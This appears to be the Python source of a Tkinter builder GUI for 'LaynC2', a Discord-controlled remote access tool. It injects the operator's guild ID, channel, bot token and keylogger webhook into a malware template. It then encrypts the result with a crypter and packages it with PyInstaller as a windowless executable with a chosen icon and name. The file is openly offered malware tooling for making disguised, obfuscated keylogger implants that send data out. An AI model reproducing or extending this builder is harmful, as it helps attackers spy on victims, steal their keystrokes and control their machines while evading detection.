import tkinter as tk
from tkinter import messagebox, filedialog
from tkinter import ttk
import subprocess
import os
import crypter

def verify_variables(file_path, guild, channel, webhook, bot_token):
    with open(file_path, "r", encoding="utf-8") as file:
        data = file.read()
        if guild not in data or str(channel) not in data or webhook not in data or bot_token not in data:
            return False
    return True

def build():
    guild = guild_entry.get()
    channel = channel_entry.get()
    webhook = webhook_entry.get()
    bot_token = bot_token_entry.get()
    icon_path = icon_entry.get() if icon_var.get() else ""
    exe_name = exe_name_entry.get() if exe_name_var.get() else ""

    # Verificação mais robusta dos campos obrigatórios
    if not guild or not channel or not webhook or not bot_token:
        messagebox.showerror("Error", "Preencha todos os campos!")
        return

    with open("E:/Hacking/Layn/main.py", "r", encoding="utf-8") as file:
        data = file.readlines()

    for i, line in enumerate(data):
        if line.startswith("GUILD = discord.Object(id ="):
            data[i] = f'GUILD = discord.Object(id = "{guild}")\n'
        elif line.startswith("CHANNEL ="):
            data[i] = f'CHANNEL = {channel}\n'
        elif line.startswith("KEYLOGGER_WEBHOOK ="):
            data[i] = f'KEYLOGGER_WEBHOOK = "{webhook}"\n'
        elif line.startswith("BOT_TOKEN ="):
            data[i] = f'BOT_TOKEN = "{bot_token}"\n'

    with open("main2.py", "w", encoding="utf-8") as temp_file:
        temp_file.writelines(data)

    # Verificar se as variáveis foram substituídas corretamente
    if not verify_variables("main2.py", guild, channel, webhook, bot_token):
        messagebox.showerror("Error", "Erro ao substituir as variáveis no arquivo main2.py")
        return

    # Criptografar o arquivo main2.py usando o crypter.py
    encrypted_file_path = crypter.encrypt_file("main2.py", "mayncrypt.py")
    print(f"Encrypted file path: {encrypted_file_path}")

    command = [
        "pyinstaller",
        "--noconfirm",
        "--onefile",
        "--windowed",
        "--noconsole",
        "--add-data",
        "E:/Hacking/Layn/libraries;libraries/",
        encrypted_file_path
    ]

    if icon_path:
        command.extend(["--icon", icon_path])
    if exe_name:
        command.extend(["--name", exe_name])

    print(f"Running command: {' '.join(command)}")

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    output, error = process.communicate()

    print(f"Output: {output}")
    print(f"Error: {error}")

    if os.path.exists("main2.py"):
        os.remove("main2.py")
    if os.path.exists(encrypted_file_path):
        os.remove(encrypted_file_path)

    if process.returncode == 0:
        messagebox.showinfo("Success", "Build completed successfully!")
    else:
        messagebox.showerror("Error", f"Build failed:\n{error}")

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
    if icon_path:
        icon_entry.delete(0, tk.END)
        icon_entry.insert(0, icon_path)

def show_pyinstaller_config():
    c2_frame.pack_forget()
    pyinstaller_frame.pack(expand=True, fill="both", padx=10, pady=10)

def show_c2_config():
    pyinstaller_frame.pack_forget()
    c2_frame.pack(expand=True, fill="both", padx=10, pady=10)

root = tk.Tk()
root.title("Build Configuration - LaynC2")
root.geometry("600x400")
root.configure(bg="#1A1A2E")

style = ttk.Style()
style.theme_use("clam")

style.configure("TLabel", font=("Courier", 12), padding=10, background="#3A0CA3", foreground="#F8F8F2")
style.configure("TEntry", font=("Courier", 12), padding=10, fieldbackground="#000000", foreground="#39FF14", insertbackground="#39FF14")
style.configure("TButton", font=("Courier", 12), padding=10, background="#0D1B2A", foreground="#FFFFFF", borderwidth=2)
style.map("TButton", background=[("active", "#3A0CA3")], foreground=[("active", "#FF00FF")])
style.configure("TFrame", background="#6A0572")
style.configure("TCheckbutton", font=("Courier", 12), background="#6A0572", foreground="#F8F8F2")

# Frame for C2 Configuration
c2_frame = ttk.Frame(root, style="TFrame", padding=20)
c2_frame.pack(expand=True, fill="both", padx=10, pady=10)

ttk.Label(c2_frame, text="Configuração do C2", style="TLabel").grid(row=0, column=0, columnspan=3, pady=10)

ttk.Label(c2_frame, text="GUILD ID:", style="TLabel").grid(row=1, column=0, sticky="w")
guild_entry = ttk.Entry(c2_frame, width=50, style="TEntry")
guild_entry.grid(row=1, column=1, padx=10, pady=5)

ttk.Label(c2_frame, text="CHANNEL ID:", style="TLabel").grid(row=2, column=0, sticky="w")
channel_entry = ttk.Entry(c2_frame, width=50, style="TEntry")
channel_entry.grid(row=2, column=1, padx=10, pady=5)

ttk.Label(c2_frame, text="KEYLOGGER WEBHOOK:", style="TLabel").grid(row=3, column=0, sticky="w")
webhook_entry = ttk.Entry(c2_frame, width=50, style="TEntry")
webhook_entry.grid(row=3, column=1, padx=10, pady=5)

ttk.Label(c2_frame, text="BOT TOKEN:", style="TLabel").grid(row=4, column=0, sticky="w")
bot_token_entry = ttk.Entry(c2_frame, width=50, style="TEntry")
bot_token_entry.grid(row=4, column=1, padx=10, pady=5)

pyinstaller_button = ttk.Button(c2_frame, text="Configurar Build", command=show_pyinstaller_config, style="TButton")
pyinstaller_button.grid(row=5, column=1, pady=10)

pyinstaller_frame = ttk.Frame(root, style="TFrame", padding=20)

ttk.Label(pyinstaller_frame, text="Configurações de Build", style="TLabel").grid(row=0, column=0, columnspan=3, pady=10)

icon_var = tk.BooleanVar()
icon_check = ttk.Checkbutton(pyinstaller_frame, text="Incluir Icon", variable=icon_var, style="TCheckbutton", command=select_icon)
icon_check.grid(row=1, column=0, sticky="w")
icon_entry = ttk.Entry(pyinstaller_frame, width=50, style="TEntry")
icon_entry.grid(row=1, column=1, padx=10, pady=5)

exe_name_var = tk.BooleanVar()
exe_name_check = ttk.Checkbutton(pyinstaller_frame, text="Nome do Executavel", variable=exe_name_var, style="TCheckbutton")
exe_name_check.grid(row=2, column=0, sticky="w")
exe_name_entry = ttk.Entry(pyinstaller_frame, width=50, style="TEntry")
exe_name_entry.grid(row=2, column=1, padx=10, pady=5)

build_button = ttk.Button(pyinstaller_frame, text="Build", command=build, style="TButton")
build_button.grid(row=3, column=1, pady=10)

back_button = ttk.Button(pyinstaller_frame, text="Voltar", command=show_c2_config, style="TButton")
back_button.grid(row=4, column=1, pady=10)

root.mainloop()